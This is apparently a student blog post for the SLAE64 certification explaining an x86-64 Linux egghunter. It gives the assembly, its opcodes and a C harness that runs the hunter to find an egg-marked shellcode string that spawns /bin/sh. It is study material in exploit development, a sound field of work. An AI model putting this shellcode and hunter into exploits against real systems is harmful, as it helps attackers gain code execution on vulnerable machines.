# Egghunter

This assignment was about creating an Egghunter shellcode.

An Egghunter shellcode is used in situations in which you are not sure where exactly your shellcode was placed. The idea is that the egghunter scans the memory for the occurence of a specific value ( the egg ) and jumps to the shellcode that is placed behind the egg.

## Shellcode

In my implementation the egg is exactly 4 bytes long.

```
_start:
    add rsp, 22 ; Dont scan the egghunter shellcode as it contains the egg as well
_huntloop:
    inc rsp ; Increment the rsp so that we search for the egg byte-wise
    cmp dword [rsp], the_egg ; Does Rsp point to the egg?
    jne _huntloop ; If it does not point to the egg do an other iteration

    ; We found the gg \0/
    add rsp, 4 ; Jump over the 4 byte egg
    jmp rsp ; Jump to the shellcode
```

## Testing the egghunter

In order to test my shellcode I created the following C program:
```
    /// AAAA IS THE EGG
    char shellcode[] = "AAAA\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
    char trash[] = "ASFHA(USFHAIFJA)FH(*HAFIONIJ)*Y(&UNMIOPJHOHOIN:IUASD";
    char egghunter[] = "\x48\x83\xc4\x16\x48\xff\xc4\x81\x3c\x24\x41\x41\x41\x41\x75\xf4\x48\x83\xc4\x04\xff\xe4";

    (*(void(*)()) egghunter)();
```

As you can see I placed some trash values between the egghunter and the actuall shellcode to make it more realistic. When the eggunter shellcode is executed the stack looks like this:

```
+-----------------------+
|                       |
|       EGGHUNTER       | <-- RSP
|                       |
+-----------------------+
|                       |
|        TRASH          |
|                       |
+-----------------------+
|                       |
|         EGG           |
|                       |
+-----------------------+
|                       |
|      SHELLCODE        |
|                       |
|                       |
+-----------------------+
```

By incrementing the RSP we let point closer and closer to the egg until it points to it.
Then I add the egg size ( 4 bytes ) to the rsp so that the rsp points to the shellcode.

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification.

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: SLAE64-1581
